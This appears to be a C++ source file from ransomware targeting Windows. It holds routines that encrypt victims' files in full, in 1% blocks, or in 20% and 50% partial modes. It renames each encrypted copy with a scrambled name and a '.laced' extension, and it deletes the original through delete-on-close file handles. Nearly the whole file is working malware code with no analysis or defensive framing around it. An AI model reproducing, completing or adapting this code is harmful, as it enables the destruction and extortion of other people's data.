#include "memory.h"
#include "filesystem.hpp"
#include "api.h"
#include "global_parameters.h"

typedef unsigned char BYTE;

#define XOR(v,w) ((v) ^ (w))
#define PLUS(v,w) (U32V((v) + (w)))
#define PLUSONE(v) (PLUS((v),1))
#define U8TO32_LITTLE(p) U32TO32_LITTLE((u32*)(p))[0]

#define ECRYPT_NAME_P ".laced"
#define ECRYPT_NAME_LEN 7
#define ECRYPT_NAME "laced"

#define SET(v,w) ((v) = (w))
	

namespace filesystem
{		


	//template<typename Type>
	//inline Type* m_new(size_t Size)
	//{
	//	Type* buf = new Type[Size];
	//	if (buf)
	//	{
	//		memset(buf, 0, Size);
	//	}
	//	return buf;
	//}
	//
	//template<typename Type>
	//inline VOID m_delete(Type Memory)
	//{
	//	delete[]Memory;
	//}

	//inline WCHAR* m_wchar(const char* arr, size_t size)
	//{
	//	WCHAR* ret_wch = m_new<WCHAR>(size);
	//	pMultiByteToWideChar(0, 0, arr, size, ret_wch, size);
	//	//mbstowcs(ret_wch, arr, size);
	//	return ret_wch;
	//}
	
	
	STATIC
	BOOL
	CheckSymbol
	(
		__in unsigned char*& PChr,
		const char*& x,
		size_t size
	)
	{		
		const CHAR BlackListSmb[] =
		{
			'>',
			'<',
			'/',
			'\\',
			':',
			'*',
			'?',
			'\"',
			'|'					
		};		
		
		int Count = sizeof(BlackListSmb) / sizeof(const char);
		for (INT j = 0; j < size; ++j)
		{
			for (INT i = 0; i < Count; ++i)
			{				
				
				if (PChr[j] == BlackListSmb[i] || PChr[j] < 32)	
				{
					SET(PChr[j], x[j]);
					break;
				}
			}
		}
		
		return TRUE;
	}
	
	VOID 
	ebytes_x
	(
		WCHAR*& bytex,
		const char* name,
		size_t len
	)
	{	
		unsigned char* ch_buf = (unsigned char*)m_malloc(256);
		if (!ch_buf)
		{
			return;
		}
		ch_buf[len] = '\0';
		
		for (int i = 0; i < len; ++i)
		{					
			u32 X0 = static_cast<u32>(Pi[i]);
			u32 ux = XOR(X0, U8TO32_LITTLE(name + (i)));
			if (!ux)
			{
				ux = PLUSONE(ux);
			}
			U32TO8_LITTLE(ch_buf + (i), ux);
		}		
		CheckSymbol(ch_buf, name, len);
		WCHAR* wch = memory::m_wchar((char*)ch_buf, len);
		if (!wch)
		{
			return;
		}

		
		wmemcpy_s(bytex, len, wch, len);
		m_free(ch_buf);		
		memory::m_delete(wch);
	}
	
	WCHAR* 
	MakeCopyFile
	(
		__in filesystem::LPFILE_INFO FileInfo		
	)
	{			
		++FileInfo->pathSize;		
		++FileInfo->fullpahtSize;
		size_t fl_len = FileInfo->nameSize - FileInfo->exsSize + 1;
		WCHAR* wargv = memory::m_wchar(FileInfo->fullpaht, FileInfo->fullpahtSize);
		WCHAR* wpath = memory::m_wchar(FileInfo->path, FileInfo->pathSize);
		WCHAR* wname = memory::m_wchar(FileInfo->name, FileInfo->nameSize + 1);
		WCHAR* wexs = memory::m_wchar(FileInfo->exs, FileInfo->exsSize + 1);
		WCHAR* wecrypt = memory::m_wchar(ECRYPT_NAME_P, ECRYPT_NAME_LEN);
		

		WCHAR* mke;		
		if (!strstr(FileInfo->exs, ECRYPT_NAME_P))
		{			
			mke = (WCHAR*)memory::m_new(FileInfo->fullpahtSize + ECRYPT_NAME_LEN - 1);
			if (!mke)
			{
				return wargv;
			}
			ebytes_x(wname, FileInfo->name, FileInfo->nameSize);
			wmemcpy_s(mke, FileInfo->fullpahtSize - 1, wargv, FileInfo->fullpahtSize - 1);
			wmemcpy_s(&mke[FileInfo->fullpahtSize - FileInfo->nameSize - 1], FileInfo->nameSize, wname, FileInfo->nameSize);
			wmemcpy_s(&mke[FileInfo->fullpahtSize - 1], ECRYPT_NAME_LEN , wecrypt, ECRYPT_NAME_LEN);
		}
		else
		{
			mke = (WCHAR*)memory::m_new(FileInfo->fullpahtSize - ECRYPT_NAME_LEN + 1);
			if (!mke)
			{
				return wargv;
			}
			ebytes_x(wname, FileInfo->name, fl_len - 1);
			wmemcpy_s(mke, FileInfo->fullpahtSize - ECRYPT_NAME_LEN, wargv, FileInfo->fullpahtSize - ECRYPT_NAME_LEN);
			wmemcpy_s(&mke[FileInfo->fullpahtSize - FileInfo->nameSize - 1], fl_len, wname, fl_len);
			mke[FileInfo->fullpahtSize - ECRYPT_NAME_LEN] = '\0';
		}
						
		
		memory::m_delete(wargv);
		memory::m_delete(wpath);
		memory::m_delete(wname);
		memory::m_delete(wexs);
		memory::m_delete(wecrypt);				
		return mke;
	}
		
	STATIC
	BOOL
	WriteFullData
	(
		__in HANDLE hFile,
		__in LPVOID Buffer,
		__in DWORD Size
	)
	{
		DWORD TotalWritten = 0;
		DWORD BytesWritten = 0;
		DWORD BytesToWrite = Size;
		DWORD Offset = 0;

		while (TotalWritten != Size)
		{

			if (!pWriteFile(hFile, (LPBYTE)Buffer + Offset, BytesToWrite, &BytesWritten, NULL) || !BytesWritten) 
			{
				return FALSE;
			}

			Offset += BytesWritten;
			TotalWritten += BytesWritten;
			BytesToWrite -= BytesWritten;
		}
		/*
		* DWORD BytesWritten;
		do
		{
			if(pReadFile(hFile, FileBuffer, FileSize.QuadPart, &dwread, NULL))
				pWriteFile(hFile2, FileBuffer, dwread, &BytesWritten, NULL);
		} while (dwread < BytesRead);*/

		return TRUE;
	}


	BOOL getParseFile
	(
		__in filesystem::LPFILE_INFO FileInfo
	)
	{
		WCHAR* FilePath = memory::m_wchar(FileInfo->fullpaht, FileInfo->fullpahtSize);	
		HANDLE hFile = pCreateFileW(FilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			printf_s("File %s is already open by another program.\n", FileInfo->name);
			memory::m_delete(FilePath);
			pCloseHandle(hFile);
			return FALSE;
		}
		FileInfo->FileHandle = hFile;

		LARGE_INTEGER FileSize;		
		if (!pGetFileSizeEx(hFile, &FileSize))
		{
			printf_s("The file %s must not be empty.\n", FileInfo->name);
			memory::m_delete(FilePath);
			pCloseHandle(hFile);
			return FALSE;
		}
		if (!FileSize.QuadPart)
		{
			printf_s("The file %s must not be empty.\n", FileInfo->name);
			memory::m_delete(FilePath);
			pCloseHandle(hFile);
			return FALSE;
		}
		FileInfo->FileSize = FileSize.QuadPart;
		FileInfo->FilePath = FilePath;

		return TRUE;
	}


	BOOL EncryptFileFullData
	(
		__in filesystem::LPFILE_INFO FileInfo,		
		WCHAR* mke
	)
	{								
		LPSTR FileBuffer = (CHAR*)m_malloc(FileInfo->FileSize);//  < 1.5 GB
		if (!FileBuffer)
		{
			memory::m_delete(FileBuffer);			
			pCloseHandle(FileInfo->FileHandle);
			return FALSE;
		}

		DWORD dwread = 0;
		BOOL Success = pReadFile(FileInfo->FileHandle, FileBuffer, FileInfo->FileSize, &dwread, NULL);
		DWORD BytesRead = FileInfo->FileSize;
		if (!Success || dwread != BytesRead)
		{
			printf_s("File %ls is failed to ReadFile.\n", mke);
			memory::m_delete(FileBuffer);			
			pCloseHandle(FileInfo->FileHandle);
			return FALSE;
		}

		BOOL SUCCESSS;
		HANDLE hFile2 = pCreateFileW(mke, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile2 == INVALID_HANDLE_VALUE)
		{		
			printf_s("File %ls is already open by another program.\n", mke);
			memory::m_delete(FileBuffer);			
			pCloseHandle(FileInfo->FileHandle);
			pCloseHandle(hFile2);
			return FALSE;
		}

		LARGE_INTEGER Offset;
		Offset.QuadPart = -((LONGLONG)dwread);		
		if (!pSetFilePointerEx(hFile2, Offset, NULL, FILE_CURRENT)) { /*std::cout << pGetLastError() << std::endl;*/ }
	
		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, (BYTE*)FileBuffer, (BYTE*)FileBuffer, BytesRead);
		SUCCESSS = WriteFullData(hFile2, FileBuffer, BytesRead);
		if (!SUCCESSS)
		{
			printf_s("File %s is failed to write\n", FileInfo->name);
			memory::m_delete(FileBuffer);			
			pCloseHandle(FileInfo->FileHandle);
			pCloseHandle(hFile2);
			return FALSE;
		}
		
		
END:
				
		m_free(FileBuffer);
		pCloseHandle(FileInfo->FileHandle);
		pCloseHandle(hFile2);

		if (pGetLastError() && pGetLastError() != 131)
			printf_s("pGetLastError %lu CheckWINAPI filename: %s\n", pGetLastError(), FileInfo->name);


		return TRUE;
	}	

	BOOL EncryptFilePartlyPercent
	(
		__in filesystem::LPFILE_INFO FileInfo,
		WCHAR* mke,
		__in BYTE DataPercent
	)
	{
		BOOL SUCCESS = FALSE;
		LARGE_INTEGER Offset;
		DWORD BytesRead;
		DWORD BytesReadW;				
		LONGLONG TotalRead;		
		LONGLONG PartSize = 0;
		LONGLONG StepSize = 0;
		INT StepsCount = 0;


		switch (DataPercent) 
		{
		case 20:
			PartSize = (FileInfo->FileSize / 100) * 7;
			StepsCount = 3;
			StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
			break;

		case 50:
			PartSize = (FileInfo->FileSize / 100) * 10;
			StepsCount = 5;
			StepSize = PartSize;
			break;

		default:
			pCloseHandle(FileInfo->FileHandle);
			return FALSE;
		}

		CHAR* BufferPart = (CHAR*)m_malloc(PartSize);
		CHAR* BufferStep = (CHAR*)m_malloc(StepSize);
		if (!BufferPart || !BufferStep)
		{
			printf_s("Heap crash.\n");
			pCloseHandle(FileInfo->FileHandle);
			return FALSE;
		}

		HANDLE hFile = pCreateFileW(mke, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			printf_s("File %ls is already open by another program.\n", mke);
			pCloseHandle(FileInfo->FileHandle);
			pCloseHandle(hFile);
			return FALSE;
		}
				
		Offset.QuadPart = 0;
		for (INT i = 0; i < StepsCount; ++i)
		{
			SUCCESS = (BOOL)pReadFile(FileInfo->FileHandle, BufferPart, PartSize, &BytesRead, NULL);
			if (!SUCCESS || !BytesRead)
			{
				printf_s("File %s is failed to Read Data.\n", FileInfo->name);
				m_free(BufferPart);
				m_free(BufferStep);
				pCloseHandle(FileInfo->FileHandle);
				pCloseHandle(hFile);
				return FALSE;
			}

			ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, (BYTE*)BufferPart, (BYTE*)BufferPart, PartSize);			
			
			pSetFilePointerEx(hFile, Offset, NULL, FILE_BEGIN);

			SUCCESS = WriteFullData(hFile, BufferPart, BytesRead);
			if (!SUCCESS)
			{
				printf_s("File %ls is failed to Write Data.\n", mke);
				m_free(BufferPart);
				m_free(BufferStep);
				pCloseHandle(FileInfo->FileHandle);
				pCloseHandle(hFile);
				return FALSE;
			}			

			Offset.QuadPart += (LONGLONG)BytesRead;
			TotalRead = 0;
			while (TotalRead < StepSize)
			{
				SUCCESS = (BOOL)pReadFile(FileInfo->FileHandle, BufferStep, StepSize, &BytesReadW, NULL);				
				if (!SUCCESS || !BytesReadW)
				{					
					break;
				}

				TotalRead += BytesReadW;				
				if (!pSetFilePointerEx(hFile, Offset, NULL, FILE_BEGIN))
				{
					break;
				}
				
				SUCCESS = WriteFullData(hFile, BufferStep, BytesReadW);
				if (!SUCCESS)
				{
					break;
				}
			}
			Offset.QuadPart += (LONGLONG)StepSize;
		}


		pCloseHandle(FileInfo->FileHandle);
		pCloseHandle(hFile);
		m_free(BufferPart);
		m_free(BufferStep);

		if (pGetLastError() && pGetLastError() != 131)
			printf_s("pGetLastError %lu CheckWINAPI filename: %s\n", pGetLastError(), FileInfo->name);
	
		return TRUE;
	}

	BOOL EncryptFilePartlyDataFull
	(
		__in filesystem::LPFILE_INFO FileInfo,
		__in WCHAR* mke
	)
	{

		LARGE_INTEGER Offset;
		DWORD BytesRead;
		BOOL SUCCESS = FALSE;		
		DWORD PernLost = FileInfo->FileSize % 100;		
		LONGLONG BytesToEncrypt = FileInfo->FileSize / 100;
		LONGLONG per = BytesToEncrypt;
		Offset.QuadPart = -BytesToEncrypt;

		
		CHAR* Buffer = (CHAR*)memory::m_new(per);
		if (!Buffer)
		{
			printf_s("Heap crash.\n");
			pCloseHandle(FileInfo->FileHandle);
			return FALSE;
		}
		
		
		HANDLE hFile = pCreateFileW(mke, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			printf_s("File %ls is already open by another program.\n", mke);
			pCloseHandle(FileInfo->FileHandle);
			pCloseHandle(hFile);
			return FALSE;
		}
		
		
		for(INT i = 0; i < 100; ++i)
		{			
			
			SUCCESS = (BOOL)pReadFile(FileInfo->FileHandle, Buffer, per, &BytesRead, NULL);			
			if (!SUCCESS || !BytesRead)
			{
				printf_s("File %ls is failed to ReadFile.\n", mke);
				memory::m_delete(Buffer);
				pCloseHandle(FileInfo->FileHandle);
				pCloseHandle(hFile);
				return FALSE;
			}			
			
			ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, (BYTE*)Buffer, (BYTE*)Buffer, BytesRead);
			Offset.QuadPart += (LONGLONG)BytesRead;	
			pSetFilePointerEx(hFile, Offset, NULL, FILE_BEGIN);
			SUCCESS = WriteFullData(hFile, Buffer, BytesRead);
			if (!SUCCESS)
			{
				printf_s("File %ls is failed to Write Data.\n", mke);
				memory::m_delete(Buffer);
				pCloseHandle(FileInfo->FileHandle);
				pCloseHandle(hFile);
				return FALSE;
			}									
		}
		if (PernLost != 0)
		{			
			CHAR* BufferL = (CHAR*)memory::m_new(PernLost);
			DWORD BytesReadL;
			SUCCESS = (BOOL)pReadFile(FileInfo->FileHandle, BufferL, PernLost, &BytesReadL, NULL);
			if (!SUCCESS || !BytesReadL)
			{
				printf_s("File %ls is failed to ReadFile.\n", mke);
				memory::m_delete(BufferL);
				pCloseHandle(FileInfo->FileHandle);
				pCloseHandle(hFile);
				return FALSE;
			}
			ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, (BYTE*)BufferL, (BYTE*)BufferL, BytesReadL);
			SUCCESS = WriteFullData(hFile, BufferL, BytesReadL);
			if (!SUCCESS)
			{
				printf_s("File %ls is failed to Write Data.\n", mke);
				memory::m_delete(BufferL);
				pCloseHandle(FileInfo->FileHandle);
				pCloseHandle(hFile);
				return FALSE;
			}
			memory::m_delete(BufferL);
		}



		memory::m_delete(Buffer);
		pCloseHandle(FileInfo->FileHandle);
		pCloseHandle(hFile);

		if (pGetLastError() && pGetLastError() != 131)
			printf_s("GetLastError %lu CheckWINAPI filename: %s\n", pGetLastError(), FileInfo->name);
		return TRUE;
	}

	BOOL ReadFile
	(
		__in filesystem::LPFILE_INFO FileInfo
	)
	{
		WCHAR* FilePath = memory::m_wchar(FileInfo->fullpaht, FileInfo->fullpahtSize);
		HANDLE hFile = pCreateFileW(FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);

		if (hFile == INVALID_HANDLE_VALUE)
		{
			printf_s("File %s is already open by another program.\n", FileInfo->name);
			memory::m_delete(FilePath);
			pCloseHandle(hFile);
			return FALSE;
		}

		LARGE_INTEGER FileSize;
		if (!pGetFileSizeEx(hFile, &FileSize))
		{
			printf_s("The file %s must not be empty.\n", FileInfo->name);
			memory::m_delete(FilePath);
			pCloseHandle(hFile);
			return FALSE;
		}
		if (!FileSize.QuadPart)
		{
			printf_s("The file %s must not be empty.\n", FileInfo->name);
			memory::m_delete(FilePath);
			pCloseHandle(hFile);
			return FALSE;
		}

		LPSTR FileBuffer = (CHAR*)m_malloc(FileSize.QuadPart);//  < 1.5 GB
		if (!FileBuffer)
		{
			memory::m_delete(FileBuffer);
			pCloseHandle(hFile);
			return FALSE;
		}

		DWORD dwread = 0;
		BOOL Success = pReadFile(hFile, FileBuffer, FileSize.QuadPart, &dwread, NULL);
		DWORD BytesRead = FileSize.QuadPart;
		if (!Success || dwread != BytesRead)
		{
			printf_s("File %s is failed to ReadFile.\n", FileInfo->fullpaht);
			memory::m_delete(FileBuffer);
			pCloseHandle(FileInfo->FileHandle);
			return FALSE;
		}

		BOOL SUCCESSS;		

		LARGE_INTEGER Offset;
		Offset.QuadPart = -((LONGLONG)dwread);		

		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, (BYTE*)FileBuffer, (BYTE*)FileBuffer, BytesRead);		

		printf_s("%s", FileBuffer);

	END:

		m_free(FileBuffer);
		pCloseHandle(hFile);

		if (pGetLastError() && pGetLastError() != 131)
			printf_s("pGetLastError %lu CheckWINAPI filename: %s\n", pGetLastError(), FileInfo->name);


		return TRUE;
	}

	BOOL filesystem::DeleteCriticalSection
	(
		__in filesystem::LPFILE_INFO FileInfo,
		__in WCHAR* mke
	)
	{
		HANDLE hFile = pCreateFileW(mke, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			printf_s("File %s is already open by another program.\n", FileInfo->name);			
			pCloseHandle(hFile);
			return FALSE;
		}

		pCloseHandle(hFile);
		return TRUE;
	}


	filesystem::FILE_INFO
	GenKey
	(		
		const char* key_setup,
		const char* ivBits
	)
	{
		filesystem::FILE_INFO x;
		RtlSecureZeroMemory(&x, sizeof(x));
		ECRYPT_keysetup(&x.CryptCtx, (BYTE*)key_setup, 256, 64);
		ECRYPT_ivsetup(&x.CryptCtx, (BYTE*)ivBits);

		return x;
	}
	BOOL map_init
	(
		const char* fullpaht,
		const char* key_setup,
		const char* ivBits,
		const char* path,
		const char* name,
		const char* exs,
		__in filesystem::LPFILE_INFO FileInfo
	)
	{

		FileInfo->fullpaht = fullpaht;
		FileInfo->key_setup = key_setup;
		FileInfo->ivBits = ivBits;
		FileInfo->path = path;
		FileInfo->name = name;
		FileInfo->exs = exs;
		FileInfo->fullpahtSize = memory::StrLen(fullpaht);
		FileInfo->pathSize = memory::StrLen(path);
		FileInfo->nameSize = memory::StrLen(name);
		FileInfo->exsSize = memory::StrLen(exs);
		if (global::GetSatus())
		{
			if (!ReadFile(FileInfo))
			{
				printf_s("Failed %s to ReadFile. GetLastError = %lu.\n", fullpaht, pGetLastError());
				return FALSE; 
			}
			return TRUE;
		}
		WCHAR* mke = MakeCopyFile(FileInfo);		
		if (!getParseFile(FileInfo))
		{
			printf_s("Failed %s to ParseFile. GetLastError = %lu.\n", fullpaht, pGetLastError());
			memory::m_delete(mke);
			return FALSE;
		}
		
		if (global::GetEncryptMode() == FULL_ENCRYPT)
		{
			if (!EncryptFileFullData(FileInfo, mke))
			{
				printf_s("Failed %s to EncryptFileFullData. GetLastError = %lu.\n", fullpaht, pGetLastError());
			}
		}		
		else if (global::GetEncryptMode() == PARTLY_ENCRYPT)
		{
			if (!EncryptFilePartlyDataFull(FileInfo, mke))
			{
				printf_s("Failed %s to EncryptFilePartlyDataFull. GetLastError = %lu.\n", fullpaht, pGetLastError());
			}
		}
		else if (global::GetEncryptMode() == PARTLYPERCENT_ENCRYPT)
		{
			if (!EncryptFilePartlyPercent(FileInfo, mke, global::GetPercent()))
			{
				printf_s("Failed %s to EncryptFilePartlyPer. GetLastError = %lu.\n", fullpaht, pGetLastError());
			}
		}
		
		
		
		memory::m_delete(mke);
		return TRUE;
	}
}
